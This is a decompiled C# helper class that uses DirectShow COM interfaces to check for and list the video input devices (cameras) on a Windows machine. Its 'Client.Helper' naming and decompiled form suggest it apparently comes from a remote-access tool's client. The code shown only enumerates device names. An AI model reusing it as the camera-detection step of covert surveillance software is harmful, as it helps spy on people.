using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace Client.Helper
{
	// Token: 0x0200000D RID: 13
	internal class Camera
	{
		// Token: 0x06000048 RID: 72 RVA: 0x00002261 File Offset: 0x00000461
		public static bool havecamera()
		{
			return Camera.FindDevices().Length != 0;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00002271 File Offset: 0x00000471
		public static string[] FindDevices()
		{
			return Camera.GetFiltes(Camera.CLSID_VideoInputDeviceCategory).ToArray();
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003BF4 File Offset: 0x00001DF4
		public static List<string> GetFiltes(Guid category)
		{
			List<string> result = new List<string>();
			Camera.EnumMonikers(category, delegate(IMoniker moniker, Camera.IPropertyBag prop)
			{
				object obj = null;
				prop.Read("FriendlyName", ref obj, 0);
				string item = (string)obj;
				result.Add(item);
				return false;
			});
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003C2C File Offset: 0x00001E2C
		private static void EnumMonikers(Guid category, Func<IMoniker, Camera.IPropertyBag, bool> func)
		{
			IEnumMoniker enumMoniker = null;
			Camera.ICreateDevEnum createDevEnum = null;
			try
			{
				createDevEnum = (Camera.ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(Camera.CLSID_SystemDeviceEnum));
				createDevEnum.CreateClassEnumerator(ref category, ref enumMoniker, 0);
				if (enumMoniker != null)
				{
					IMoniker[] array = new IMoniker[1];
					IntPtr zero = IntPtr.Zero;
					while (enumMoniker.Next(array.Length, array, zero) == 0)
					{
						IMoniker moniker = array[0];
						object obj = null;
						Guid iid_IPropertyBag = Camera.IID_IPropertyBag;
						moniker.BindToStorage(null, null, ref iid_IPropertyBag, out obj);
						Camera.IPropertyBag propertyBag = (Camera.IPropertyBag)obj;
						try
						{
							if (func(moniker, propertyBag))
							{
								break;
							}
						}
						finally
						{
							Marshal.ReleaseComObject(propertyBag);
							if (moniker != null)
							{
								Marshal.ReleaseComObject(moniker);
							}
						}
					}
				}
			}
			finally
			{
				if (enumMoniker != null)
				{
					Marshal.ReleaseComObject(enumMoniker);
				}
				if (createDevEnum != null)
				{
					Marshal.ReleaseComObject(createDevEnum);
				}
			}
		}

		// Token: 0x0400002E RID: 46
		public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");

		// Token: 0x0400002F RID: 47
		public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");

		// Token: 0x04000030 RID: 48
		public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");

		// Token: 0x0200000E RID: 14
		[ComVisible(true)]
		[Guid("29840822-5B84-11D0-BD3B-00A0C911CE86")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		[ComImport]
		public interface ICreateDevEnum
		{
			// Token: 0x0600004E RID: 78
			int CreateClassEnumerator([In] ref Guid pType, [In] [Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
		}

		// Token: 0x0200000F RID: 15
		[ComVisible(true)]
		[Guid("55272A00-42CB-11CE-8135-00AA004BB851")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		[ComImport]
		public interface IPropertyBag
		{
			// Token: 0x0600004F RID: 79
			int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);

			// Token: 0x06000050 RID: 80
			int Write(string PropName, ref object Var);
		}
	}
}
